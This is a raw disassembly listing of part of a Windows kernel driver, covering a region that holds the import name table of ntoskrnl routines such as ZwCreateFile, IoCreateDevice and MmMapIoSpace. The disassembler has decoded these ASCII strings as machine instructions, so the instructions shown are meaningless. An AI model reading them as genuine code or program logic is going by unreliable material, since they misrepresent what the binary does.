   14000a20a:	52                   	push   %rdx
   14000a20b:	74 6c                	je     0x14000a279
   14000a20d:	43 6f                	rex.XB outsl (%rsi),(%dx)
   14000a20f:	6d                   	insl   (%dx),(%rdi)
   14000a210:	70 61                	jo     0x14000a273
   14000a212:	72 65                	jb     0x14000a279
   14000a214:	55                   	push   %rbp
   14000a215:	6e                   	outsb  (%rsi),(%dx)
   14000a216:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%rbx),%esp
   14000a21d:	72 69                	jb     0x14000a288
   14000a21f:	6e                   	outsb  (%rsi),(%dx)
   14000a220:	67 00 2a             	add    %ch,(%edx)
   14000a223:	05 5a 77 43 72       	add    $0x7243775a,%eax
   14000a228:	65 61                	gs (bad)
   14000a22a:	74 65                	je     0x14000a291
   14000a22c:	46 69 6c 65 00 00 31 	imul   $0x44003100,0x0(%rbp,%r12,2),%r13d
   14000a233:	00 44 
   14000a235:	62 67 50 72 69       	(bad)
   14000a23a:	6e                   	outsb  (%rsi),(%dx)
   14000a23b:	74 00                	je     0x14000a23d
   14000a23d:	00 3a                	add    %bh,(%rdx)
   14000a23f:	04 52                	add    $0x52,%al
   14000a241:	74 6c                	je     0x14000a2af
   14000a243:	49 6e                	rex.WB outsb (%rsi),(%dx)
   14000a245:	69 74 41 6e 73 69 53 	imul   $0x74536973,0x6e(%rcx,%rax,2),%esi
   14000a24c:	74 
   14000a24d:	72 69                	jb     0x14000a2b8
   14000a24f:	6e                   	outsb  (%rsi),(%dx)
   14000a250:	67 00 d0             	addr32 add %dl,%al
   14000a253:	03 52 74             	add    0x74(%rdx),%edx
   14000a256:	6c                   	insb   (%dx),(%rdi)
   14000a257:	41 6e                	rex.B outsb (%rsi),(%dx)
   14000a259:	73 69                	jae    0x14000a2c4
   14000a25b:	53                   	push   %rbx
   14000a25c:	74 72                	je     0x14000a2d0
   14000a25e:	69 6e 67 54 6f 55 6e 	imul   $0x6e556f54,0x67(%rsi),%ebp
   14000a265:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%rbx),%esp
   14000a26c:	72 69                	jb     0x14000a2d7
   14000a26e:	6e                   	outsb  (%rsi),(%dx)
   14000a26f:	67 00 00             	add    %al,(%eax)
   14000a272:	94                   	xchg   %eax,%esp
   14000a273:	05 5a 77 57 72       	add    $0x7257775a,%eax
   14000a278:	69 74 65 46 69 6c 65 	imul   $0x656c69,0x46(%rbp,%riz,2),%esi
   14000a27f:	00 
   14000a280:	25 04 52 74 6c       	and    $0x6c745204,%eax
   14000a285:	46 72 65             	rex.RX jb 0x14000a2ed
   14000a288:	65 55                	gs push %rbp
   14000a28a:	6e                   	outsb  (%rsi),(%dx)
   14000a28b:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%rbx),%esp
   14000a292:	72 69                	jb     0x14000a2fd
   14000a294:	6e                   	outsb  (%rsi),(%dx)
   14000a295:	67 00 00             	add    %al,(%eax)
   14000a298:	2e 02 4b 65          	cs add 0x65(%rbx),%cl
   14000a29c:	49 6e                	rex.WB outsb (%rsi),(%dx)
   14000a29e:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   14000a2a5:	65 
   14000a2a6:	45 76 65             	rex.RB jbe 0x14000a30e
   14000a2a9:	6e                   	outsb  (%rsi),(%dx)
   14000a2aa:	74 00                	je     0x14000a2ac
   14000a2ac:	3c 01                	cmp    $0x1,%al
   14000a2ae:	49 6f                	rex.WB outsl (%rsi),(%dx)
   14000a2b0:	42 75 69             	rex.X jne 0x14000a31c
   14000a2b3:	6c                   	insb   (%dx),(%rdi)
   14000a2b4:	64 44                	fs rex.R
   14000a2b6:	65 76 69             	gs jbe 0x14000a322
   14000a2b9:	63 65 49             	movsxd 0x49(%rbp),%esp
   14000a2bc:	6f                   	outsl  (%rsi),(%dx)
   14000a2bd:	43 6f                	rex.XB outsl (%rsi),(%dx)
   14000a2bf:	6e                   	outsb  (%rsi),(%dx)
   14000a2c0:	74 72                	je     0x14000a334
   14000a2c2:	6f                   	outsl  (%rsi),(%dx)
   14000a2c3:	6c                   	insb   (%dx),(%rdi)
   14000a2c4:	52                   	push   %rdx
   14000a2c5:	65 71 75             	gs jno 0x14000a33d
   14000a2c8:	65 73 74             	gs jae 0x14000a33f
   14000a2cb:	00 f5                	add    %dh,%ch
   14000a2cd:	01 49 6f             	add    %ecx,0x6f(%rcx)
   14000a2d0:	66 43 61             	data16 rex.XB (bad)
   14000a2d3:	6c                   	insb   (%dx),(%rdi)
   14000a2d4:	6c                   	insb   (%dx),(%rdi)
   14000a2d5:	44 72 69             	rex.R jb 0x14000a341
   14000a2d8:	76 65                	jbe    0x14000a33f
   14000a2da:	72 00                	jb     0x14000a2dc
   14000a2dc:	94                   	xchg   %eax,%esp
   14000a2dd:	02 4b 65             	add    0x65(%rbx),%cl
   14000a2e0:	57                   	push   %rdi
   14000a2e1:	61                   	(bad)
   14000a2e2:	69 74 46 6f 72 53 69 	imul   $0x6e695372,0x6f(%rsi,%rax,2),%esi
   14000a2e9:	6e 
   14000a2ea:	67 6c                	insb   (%dx),(%edi)
   14000a2ec:	65 4f 62 6a 65 63 74 	(bad)
   14000a2f3:	00 6c 00 45          	add    %ch,0x45(%rax,%rax,1)
   14000a2f7:	78 49                	js     0x14000a342
   14000a2f9:	6e                   	outsb  (%rsi),(%dx)
   14000a2fa:	74 65                	je     0x14000a361
   14000a2fc:	72 6c                	jb     0x14000a36a
   14000a2fe:	6f                   	outsl  (%rsi),(%dx)
   14000a2ff:	63 6b 65             	movsxd 0x65(%rbx),%ebp
   14000a302:	64 52                	fs push %rdx
   14000a304:	65 6d                	gs insl (%dx),(%rdi)
   14000a306:	6f                   	outsl  (%rsi),(%dx)
   14000a307:	76 65                	jbe    0x14000a36e
   14000a309:	48                   	rex.W
   14000a30a:	65 61                	gs (bad)
   14000a30c:	64 4c 69 73 74 00 c6 	imul   $0x4d02c600,%fs:0x74(%rbx),%r14
   14000a313:	02 4d 
   14000a315:	6d                   	insl   (%dx),(%rdi)
   14000a316:	49 73 41             	rex.WB jae 0x14000a35a
   14000a319:	64 64 72 65          	fs fs jb 0x14000a382
   14000a31d:	73 73                	jae    0x14000a392
   14000a31f:	56                   	push   %rsi
   14000a320:	61                   	(bad)
   14000a321:	6c                   	insb   (%dx),(%rdi)
   14000a322:	69 64 00 00 9f 00 45 	imul   $0x7845009f,0x0(%rax,%rax,1),%esp
   14000a329:	78 
   14000a32a:	70 49                	jo     0x14000a375
   14000a32c:	6e                   	outsb  (%rsi),(%dx)
   14000a32d:	74 65                	je     0x14000a394
   14000a32f:	72 6c                	jb     0x14000a39d
   14000a331:	6f                   	outsl  (%rsi),(%dx)
   14000a332:	63 6b 65             	movsxd 0x65(%rbx),%ebp
   14000a335:	64 50                	fs push %rax
   14000a337:	6f                   	outsl  (%rsi),(%dx)
   14000a338:	70 45                	jo     0x14000a37f
   14000a33a:	6e                   	outsb  (%rsi),(%dx)
   14000a33b:	74 72                	je     0x14000a3af
   14000a33d:	79 53                	jns    0x14000a392
   14000a33f:	4c 69 73 74 00 69 00 	imul   $0x45006900,0x74(%rbx),%r14
   14000a346:	45 
   14000a347:	78 49                	js     0x14000a392
   14000a349:	6e                   	outsb  (%rsi),(%dx)
   14000a34a:	74 65                	je     0x14000a3b1
   14000a34c:	72 6c                	jb     0x14000a3ba
   14000a34e:	6f                   	outsl  (%rsi),(%dx)
   14000a34f:	63 6b 65             	movsxd 0x65(%rbx),%ebp
   14000a352:	64 49 6e             	rex.WB outsb %fs:(%rsi),(%dx)
   14000a355:	73 65                	jae    0x14000a3bc
   14000a357:	72 74                	jb     0x14000a3cd
   14000a359:	54                   	push   %rsp
   14000a35a:	61                   	(bad)
   14000a35b:	69 6c 4c 69 73 74 00 	imul   $0x64007473,0x69(%rsp,%rcx,2),%ebp
   14000a362:	64 
   14000a363:	02 4b 65             	add    0x65(%rbx),%cl
   14000a366:	52                   	push   %rdx
   14000a367:	65 6c                	gs insb (%dx),(%rdi)
   14000a369:	65 61                	gs (bad)
   14000a36b:	73 65                	jae    0x14000a3d2
   14000a36d:	53                   	push   %rbx
   14000a36e:	65 6d                	gs insl (%dx),(%rdi)
   14000a370:	61                   	(bad)
   14000a371:	70 68                	jo     0x14000a3db
   14000a373:	6f                   	outsl  (%rsi),(%dx)
   14000a374:	72 65                	jb     0x14000a3db
   14000a376:	00 00                	add    %al,(%rax)
   14000a378:	a0 00 45 78 70 49 6e 	movabs 0x65746e4970784500,%al
   14000a37f:	74 65 
   14000a381:	72 6c                	jb     0x14000a3ef
   14000a383:	6f                   	outsl  (%rsi),(%dx)
   14000a384:	63 6b 65             	movsxd 0x65(%rbx),%ebp
   14000a387:	64 50                	fs push %rax
   14000a389:	75 73                	jne    0x14000a3fe
   14000a38b:	68 45 6e 74 72       	push   $0x72746e45
   14000a390:	79 53                	jns    0x14000a3e5
   14000a392:	4c 69 73 74 00 00 72 	imul   $0x720000,0x74(%rbx),%r14
   14000a399:	00 
   14000a39a:	45 78 51             	rex.RB js 0x14000a3ee
   14000a39d:	75 65                	jne    0x14000a404
   14000a39f:	72 79                	jb     0x14000a41a
   14000a3a1:	44                   	rex.R
   14000a3a2:	65 70 74             	gs jo  0x14000a419
   14000a3a5:	68 53 4c 69 73       	push   $0x73694c53
   14000a3aa:	74 00                	je     0x14000a3ac
   14000a3ac:	c4 03 50 73          	(bad)
   14000a3b0:	54                   	push   %rsp
   14000a3b1:	65 72 6d             	gs jb  0x14000a421
   14000a3b4:	69 6e 61 74 65 53 79 	imul   $0x79536574,0x61(%rsi),%ebp
   14000a3bb:	73 74                	jae    0x14000a431
   14000a3bd:	65 6d                	gs insl (%dx),(%rdi)
   14000a3bf:	54                   	push   %rsp
   14000a3c0:	68 72 65 61 64       	push   $0x64616572
   14000a3c5:	00 4b 03             	add    %cl,0x3(%rbx)
   14000a3c8:	4f 62 52 65 66 65    	(bad)
   14000a3ce:	72 65                	jb     0x14000a435
   14000a3d0:	6e                   	outsb  (%rsi),(%dx)
   14000a3d1:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   14000a3d4:	62 6a 65 63 74       	(bad)
   14000a3d9:	42 79 4e             	rex.X jns 0x14000a42a
   14000a3dc:	61                   	(bad)
   14000a3dd:	6d                   	insl   (%dx),(%rdi)
   14000a3de:	65 00 67 01          	add    %ah,%gs:0x1(%rdi)
   14000a3e2:	49 6f                	rex.WB outsl (%rsi),(%dx)
   14000a3e4:	44 72 69             	rex.R jb 0x14000a450
   14000a3e7:	76 65                	jbe    0x14000a44e
   14000a3e9:	72 4f                	jb     0x14000a43a
   14000a3eb:	62 6a 65 63 74       	(bad)
   14000a3f0:	54                   	push   %rsp
   14000a3f1:	79 70                	jns    0x14000a463
   14000a3f3:	65 00 00             	add    %al,%gs:(%rax)
   14000a3f6:	52                   	push   %rdx
   14000a3f7:	03 4f 62             	add    0x62(%rdi),%ecx
   14000a3fa:	66 44                	data16 rex.R
   14000a3fc:	65 72 65             	gs jb  0x14000a464
   14000a3ff:	66 65 72 65          	data16 gs jb 0x14000a468
   14000a403:	6e                   	outsb  (%rsi),(%dx)
   14000a404:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   14000a407:	62 6a 65 63 74       	(bad)
   14000a40c:	00 00                	add    %al,(%rax)
   14000a40e:	7d 01                	jge    0x14000a411
   14000a410:	49 6f                	rex.WB outsl (%rsi),(%dx)
   14000a412:	47                   	rex.RXB
   14000a413:	65 74 44             	gs je  0x14000a45a
   14000a416:	65 76 69             	gs jbe 0x14000a482
   14000a419:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   14000a41c:	62 6a 65 63 74       	(bad)
   14000a421:	50                   	push   %rax
   14000a422:	6f                   	outsl  (%rsi),(%dx)
   14000a423:	69 6e 74 65 72 00 00 	imul   $0x7265,0x74(%rsi),%ebp
   14000a42a:	5f                   	pop    %rdi
   14000a42b:	00 45 78             	add    %al,0x78(%rbp)
   14000a42e:	49 6e                	rex.WB outsb (%rsi),(%dx)
   14000a430:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   14000a437:	65 
   14000a438:	4e 50                	rex.WRX push %rax
   14000a43a:	61                   	(bad)
   14000a43b:	67 65 64 4c 6f       	gs rex.WR outsl %fs:(%esi),(%dx)
   14000a440:	6f                   	outsl  (%rsi),(%dx)
   14000a441:	6b 61 73 69          	imul   $0x69,0x73(%rcx),%esp
   14000a445:	64 65 4c 69 73 74 00 	fs imul $0x4b023400,%gs:0x74(%rbx),%r14
   14000a44c:	34 02 4b 
   14000a44f:	65 49 6e             	rex.WB outsb %gs:(%rsi),(%dx)
   14000a452:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   14000a459:	65 
   14000a45a:	53                   	push   %rbx
   14000a45b:	65 6d                	gs insl (%dx),(%rdi)
   14000a45d:	61                   	(bad)
   14000a45e:	70 68                	jo     0x14000a4c8
   14000a460:	6f                   	outsl  (%rsi),(%dx)
   14000a461:	72 65                	jb     0x14000a4c8
   14000a463:	00 6e 03             	add    %ch,0x3(%rsi)
   14000a466:	50                   	push   %rax
   14000a467:	73 43                	jae    0x14000a4ac
   14000a469:	72 65                	jb     0x14000a4d0
   14000a46b:	61                   	(bad)
   14000a46c:	74 65                	je     0x14000a4d3
   14000a46e:	53                   	push   %rbx
   14000a46f:	79 73                	jns    0x14000a4e4
   14000a471:	74 65                	je     0x14000a4d8
   14000a473:	6d                   	insl   (%dx),(%rdi)
   14000a474:	54                   	push   %rsp
   14000a475:	68 72 65 61 64       	push   $0x64616572
   14000a47a:	00 00                	add    %al,(%rax)
   14000a47c:	25 05 5a 77 43       	and    $0x43775a05,%eax
   14000a481:	6c                   	insb   (%dx),(%rdi)
   14000a482:	6f                   	outsl  (%rsi),(%dx)
   14000a483:	73 65                	jae    0x14000a4ea
   14000a485:	00 79 01             	add    %bh,0x1(%rcx)
   14000a488:	49 6f                	rex.WB outsl (%rsi),(%dx)
   14000a48a:	47                   	rex.RXB
   14000a48b:	65 74 43             	gs je  0x14000a4d1
   14000a48e:	75 72                	jne    0x14000a502
   14000a490:	72 65                	jb     0x14000a4f7
   14000a492:	6e                   	outsb  (%rsi),(%dx)
   14000a493:	74 50                	je     0x14000a4e5
   14000a495:	72 6f                	jb     0x14000a506
   14000a497:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000a49a:	73 00                	jae    0x14000a49c
   14000a49c:	6f                   	outsl  (%rsi),(%dx)
   14000a49d:	05 5a 77 51 75       	add    $0x7551775a,%eax
   14000a4a2:	65 72 79             	gs jb  0x14000a51e
   14000a4a5:	53                   	push   %rbx
   14000a4a6:	79 73                	jns    0x14000a51b
   14000a4a8:	74 65                	je     0x14000a50f
   14000a4aa:	6d                   	insl   (%dx),(%rdi)
   14000a4ab:	49 6e                	rex.WB outsb (%rsi),(%dx)
   14000a4ad:	66 6f                	outsw  (%rsi),(%dx)
   14000a4af:	72 6d                	jb     0x14000a51e
   14000a4b1:	61                   	(bad)
   14000a4b2:	74 69                	je     0x14000a51d
   14000a4b4:	6f                   	outsl  (%rsi),(%dx)
   14000a4b5:	6e                   	outsb  (%rsi),(%dx)
   14000a4b6:	00 00                	add    %al,(%rax)
   14000a4b8:	43 00 45 78          	rex.XB add %al,0x78(%r13)
   14000a4bc:	41 6c                	rex.B insb (%dx),(%rdi)
   14000a4be:	6c                   	insb   (%dx),(%rdi)
   14000a4bf:	6f                   	outsl  (%rsi),(%dx)
   14000a4c0:	63 61 74             	movsxd 0x74(%rcx),%esp
   14000a4c3:	65 50                	gs push %rax
   14000a4c5:	6f                   	outsl  (%rsi),(%dx)
   14000a4c6:	6f                   	outsl  (%rsi),(%dx)
   14000a4c7:	6c                   	insb   (%dx),(%rdi)
   14000a4c8:	00 00                	add    %al,(%rax)
   14000a4ca:	58                   	pop    %rax
   14000a4cb:	00 45 78             	add    %al,0x78(%rbp)
   14000a4ce:	46 72 65             	rex.RX jb 0x14000a536
   14000a4d1:	65 50                	gs push %rax
   14000a4d3:	6f                   	outsl  (%rsi),(%dx)
   14000a4d4:	6f                   	outsl  (%rsi),(%dx)
   14000a4d5:	6c                   	insb   (%dx),(%rdi)
   14000a4d6:	57                   	push   %rdi
   14000a4d7:	69 74 68 54 61 67 00 	imul   $0xa1006761,0x54(%rax,%rbp,2),%esi
   14000a4de:	a1 
   14000a4df:	05 5f 73 74 72       	add    $0x7274735f,%eax
   14000a4e4:	69 63 6d 70 00 00 61 	imul   $0x61000070,0x6d(%rbx),%esp
   14000a4eb:	01 49 6f             	add    %ecx,0x6f(%rcx)
   14000a4ee:	44                   	rex.R
   14000a4ef:	65 6c                	gs insb (%dx),(%rdi)
   14000a4f1:	65 74 65             	gs je  0x14000a559
   14000a4f4:	53                   	push   %rbx
   14000a4f5:	79 6d                	jns    0x14000a564
   14000a4f7:	62 6f 6c 69 63       	(bad)
   14000a4fc:	4c 69 6e 6b 00 00 5f 	imul   $0x15f0000,0x6b(%rsi),%r13
   14000a503:	01 
   14000a504:	49 6f                	rex.WB outsl (%rsi),(%dx)
   14000a506:	44                   	rex.R
   14000a507:	65 6c                	gs insb (%dx),(%rdi)
   14000a509:	65 74 65             	gs je  0x14000a571
   14000a50c:	44                   	rex.R
   14000a50d:	65 76 69             	gs jbe 0x14000a579
   14000a510:	63 65 00             	movsxd 0x0(%rbp),%esp
   14000a513:	00 f6                	add    %dh,%dh
   14000a515:	01 49 6f             	add    %ecx,0x6f(%rcx)
   14000a518:	66 43 6f             	rex.XB outsw (%rsi),(%dx)
   14000a51b:	6d                   	insl   (%dx),(%rdi)
   14000a51c:	70 6c                	jo     0x14000a58a
   14000a51e:	65 74 65             	gs je  0x14000a586
   14000a521:	52                   	push   %rdx
   14000a522:	65 71 75             	gs jno 0x14000a59a
   14000a525:	65 73 74             	gs jae 0x14000a59c
   14000a528:	00 00                	add    %al,(%rax)
   14000a52a:	4f 05 5a 77 4f 70    	rex.WRXB add $0x704f775a,%rax
   14000a530:	65 6e                	outsb  %gs:(%rsi),(%dx)
   14000a532:	4b                   	rex.WXB
   14000a533:	65 79 00             	gs jns 0x14000a536
   14000a536:	70 05                	jo     0x14000a53d
   14000a538:	5a                   	pop    %rdx
   14000a539:	77 51                	ja     0x14000a58c
   14000a53b:	75 65                	jne    0x14000a5a2
   14000a53d:	72 79                	jb     0x14000a5b8
   14000a53f:	56                   	push   %rsi
   14000a540:	61                   	(bad)
   14000a541:	6c                   	insb   (%dx),(%rdi)
   14000a542:	75 65                	jne    0x14000a5a9
   14000a544:	4b                   	rex.WXB
   14000a545:	65 79 00             	gs jns 0x14000a548
   14000a548:	46 00 45 78          	rex.RX add %r8b,0x78(%rbp)
   14000a54c:	41 6c                	rex.B insb (%dx),(%rdi)
   14000a54e:	6c                   	insb   (%dx),(%rdi)
   14000a54f:	6f                   	outsl  (%rsi),(%dx)
   14000a550:	63 61 74             	movsxd 0x74(%rcx),%esp
   14000a553:	65 50                	gs push %rax
   14000a555:	6f                   	outsl  (%rsi),(%dx)
   14000a556:	6f                   	outsl  (%rsi),(%dx)
   14000a557:	6c                   	insb   (%dx),(%rdi)
   14000a558:	57                   	push   %rdi
   14000a559:	69 74 68 54 61 67 00 	imul   $0x18006761,0x54(%rax,%rbp,2),%esi
   14000a560:	18 
   14000a561:	02 4b 65             	add    0x65(%rbx),%cl
   14000a564:	44                   	rex.R
   14000a565:	65 6c                	gs insb (%dx),(%rdi)
   14000a567:	61                   	(bad)
   14000a568:	79 45                	jns    0x14000a5af
   14000a56a:	78 65                	js     0x14000a5d1
   14000a56c:	63 75 74             	movsxd 0x74(%rbp),%esi
   14000a56f:	69 6f 6e 54 68 72 65 	imul   $0x65726854,0x6e(%rdi),%ebp
   14000a576:	61                   	(bad)
   14000a577:	64 00 00             	add    %al,%fs:(%rax)
   14000a57a:	4c 01 49 6f          	add    %r9,0x6f(%rcx)
   14000a57e:	43 72 65             	rex.XB jb 0x14000a5e6
   14000a581:	61                   	(bad)
   14000a582:	74 65                	je     0x14000a5e9
   14000a584:	44                   	rex.R
   14000a585:	65 76 69             	gs jbe 0x14000a5f1
   14000a588:	63 65 00             	movsxd 0x0(%rbp),%esp
   14000a58b:	00 97 01 49 6f 49    	add    %dl,0x496f4901(%rdi)
   14000a591:	73 57                	jae    0x14000a5ea
   14000a593:	64 6d                	fs insl (%dx),(%rdi)
   14000a595:	56                   	push   %rsi
   14000a596:	65 72 73             	gs jb  0x14000a60c
   14000a599:	69 6f 6e 41 76 61 69 	imul   $0x69617641,0x6e(%rdi),%ebp
   14000a5a0:	6c                   	insb   (%dx),(%rdi)
   14000a5a1:	61                   	(bad)
   14000a5a2:	62 6c 65 00 55       	(bad)
   14000a5a7:	01 49 6f             	add    %ecx,0x6f(%rcx)
   14000a5aa:	43 72 65             	rex.XB jb 0x14000a612
   14000a5ad:	61                   	(bad)
   14000a5ae:	74 65                	je     0x14000a615
   14000a5b0:	53                   	push   %rbx
   14000a5b1:	79 6d                	jns    0x14000a620
   14000a5b3:	62 6f 6c 69 63       	(bad)
   14000a5b8:	4c 69 6e 6b 00 00 a9 	imul   $0x5a90000,0x6b(%rsi),%r13
   14000a5bf:	05 
   14000a5c0:	5f                   	pop    %rdi
   14000a5c1:	76 73                	jbe    0x14000a636
   14000a5c3:	6e                   	outsb  (%rsi),(%dx)
   14000a5c4:	77 70                	ja     0x14000a636
   14000a5c6:	72 69                	jb     0x14000a631
   14000a5c8:	6e                   	outsb  (%rsi),(%dx)
   14000a5c9:	74 66                	je     0x14000a631
   14000a5cb:	00 4a 03             	add    %cl,0x3(%rdx)
   14000a5ce:	4f 62 52 65 66 65    	(bad)
   14000a5d4:	72 65                	jb     0x14000a63b
   14000a5d6:	6e                   	outsb  (%rsi),(%dx)
   14000a5d7:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   14000a5da:	62 6a 65 63 74       	(bad)
   14000a5df:	42 79 48             	rex.X jns 0x14000a62a
   14000a5e2:	61                   	(bad)
   14000a5e3:	6e                   	outsb  (%rsi),(%dx)
   14000a5e4:	64 6c                	fs insb (%dx),(%rdi)
   14000a5e6:	65 00 c0             	gs add %al,%al
   14000a5e9:	02 4d 6d             	add    0x6d(%rbp),%cl
   14000a5ec:	47                   	rex.RXB
   14000a5ed:	65 74 50             	gs je  0x14000a640
   14000a5f0:	68 79 73 69 63       	push   $0x63697379
   14000a5f5:	61                   	(bad)
   14000a5f6:	6c                   	insb   (%dx),(%rdi)
   14000a5f7:	41                   	rex.B
   14000a5f8:	64 64 72 65          	fs fs jb 0x14000a661
   14000a5fc:	73 73                	jae    0x14000a671
   14000a5fe:	00 00                	add    %al,(%rax)
   14000a600:	d0 02                	rolb   $1,(%rdx)
   14000a602:	4d 6d                	rex.WRB insl (%dx),(%rdi)
   14000a604:	4d 61                	rex.WRB (bad)
   14000a606:	70 49                	jo     0x14000a651
   14000a608:	6f                   	outsl  (%rsi),(%dx)
   14000a609:	53                   	push   %rbx
   14000a60a:	70 61                	jo     0x14000a66d
   14000a60c:	63 65 00             	movsxd 0x0(%rbp),%esp
   14000a60f:	00 ee                	add    %ch,%dh
   14000a611:	02 4d 6d             	add    0x6d(%rbp),%cl
   14000a614:	55                   	push   %rbp
   14000a615:	6e                   	outsb  (%rsi),(%dx)
   14000a616:	6d                   	insl   (%dx),(%rdi)
   14000a617:	61                   	(bad)
   14000a618:	70 49                	jo     0x14000a663
   14000a61a:	6f                   	outsl  (%rsi),(%dx)
   14000a61b:	53                   	push   %rbx
   14000a61c:	70 61                	jo     0x14000a67f
   14000a61e:	63 65 00             	movsxd 0x0(%rbp),%esp
   14000a621:	00 dd                	add    %bl,%ch
   14000a623:	03 52 74             	add    0x74(%rdx),%edx
   14000a626:	6c                   	insb   (%dx),(%rdi)
   14000a627:	43 68 65 63 6b 52    	rex.XB push $0x526b6365
   14000a62d:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%ebx),%esi
   14000a634:	4b 65 
   14000a636:	79 00                	jns    0x14000a638
   14000a638:	37                   	(bad)
   14000a639:	01 49 6f             	add    %ecx,0x6f(%rcx)
   14000a63c:	41 74 74             	rex.B je 0x14000a6b3
   14000a63f:	61                   	(bad)
   14000a640:	63 68 44             	movsxd 0x44(%rax),%ebp
   14000a643:	65 76 69             	gs jbe 0x14000a6af
   14000a646:	63 65 00             	movsxd 0x0(%rbp),%esp
   14000a649:	00 62 01             	add    %ah,0x1(%rdx)
   14000a64c:	49 6f                	rex.WB outsl (%rsi),(%dx)
   14000a64e:	44                   	rex.R
   14000a64f:	65 74 61             	gs je  0x14000a6b3
   14000a652:	63 68 44             	movsxd 0x44(%rax),%ebp
   14000a655:	65 76 69             	gs jbe 0x14000a6c1
   14000a658:	63 65 00             	movsxd 0x0(%rbp),%esp
   14000a65b:	00 64 03 50          	add    %ah,0x50(%rbx,%rax,1)
   14000a65f:	6f                   	outsl  (%rsi),(%dx)
   14000a660:	53                   	push   %rbx
   14000a661:	74 61                	je     0x14000a6c4
   14000a663:	72 74                	jb     0x14000a6d9
   14000a665:	4e                   	rex.WRX
   14000a666:	65 78 74             	gs js  0x14000a6dd
   14000a669:	50                   	push   %rax
   14000a66a:	6f                   	outsl  (%rsi),(%dx)
   14000a66b:	77 65                	ja     0x14000a6d2
   14000a66d:	72 49                	jb     0x14000a6b8
   14000a66f:	72 70                	jb     0x14000a6e1
   14000a671:	00 75 03             	add    %dh,0x3(%rbp)
   14000a674:	50                   	push   %rax
   14000a675:	73 47                	jae    0x14000a6be
   14000a677:	65 74 43             	gs je  0x14000a6bd
   14000a67a:	75 72                	jne    0x14000a6ee
   14000a67c:	72 65                	jb     0x14000a6e3
   14000a67e:	6e                   	outsb  (%rsi),(%dx)
   14000a67f:	74 50                	je     0x14000a6d1
   14000a681:	72 6f                	jb     0x14000a6f2
   14000a683:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000a686:	73 49                	jae    0x14000a6d1
   14000a688:	64 00 c2             	fs add %al,%dl
   14000a68b:	02 4d 6d             	add    0x6d(%rbp),%cl
   14000a68e:	47                   	rex.RXB
   14000a68f:	65 74 53             	gs je  0x14000a6e5
   14000a692:	79 73                	jns    0x14000a707
   14000a694:	74 65                	je     0x14000a6fb
   14000a696:	6d                   	insl   (%dx),(%rdi)
   14000a697:	52                   	push   %rdx
   14000a698:	6f                   	outsl  (%rsi),(%dx)
   14000a699:	75 74                	jne    0x14000a70f
   14000a69b:	69 6e 65 41 64 64 72 	imul   $0x72646441,0x65(%rsi),%ebp
   14000a6a2:	65 73 73             	gs jae 0x14000a718
   14000a6a5:	00 a0 03 50 73 47    	add    %ah,0x47735003(%rax)
   14000a6ab:	65 74 56             	gs je  0x14000a704
   14000a6ae:	65 72 73             	gs jb  0x14000a724
   14000a6b1:	69 6f 6e 00 00 6e 74 	imul   $0x746e0000,0x6e(%rdi),%ebp
   14000a6b8:	6f                   	outsl  (%rsi),(%dx)
   14000a6b9:	73 6b                	jae    0x14000a726
   14000a6bb:	72 6e                	jb     0x14000a72b
   14000a6bd:	6c                   	insb   (%dx),(%rdi)
   14000a6be:	2e 65 78 65          	cs js,pn 0x14000a727
   14000a6c2:	00 00                	add    %al,(%rax)
   14000a6c4:	96                   	xchg   %eax,%esi
   14000a6c5:	05 5f 5f 43 5f       	add    $0x5f435f5f,%eax
   14000a6ca:	73 70                	jae    0x14000a73c
   14000a6cc:	65 63 69 66          	movsxd %gs:0x66(%rcx),%ebp
   14000a6d0:	69 63 5f 68 61 6e 64 	imul   $0x646e6168,0x5f(%rbx),%esp
   14000a6d7:	6c                   	insb   (%dx),(%rdi)
   14000a6d8:	65 72 00             	gs jb  0x14000a6db
	...
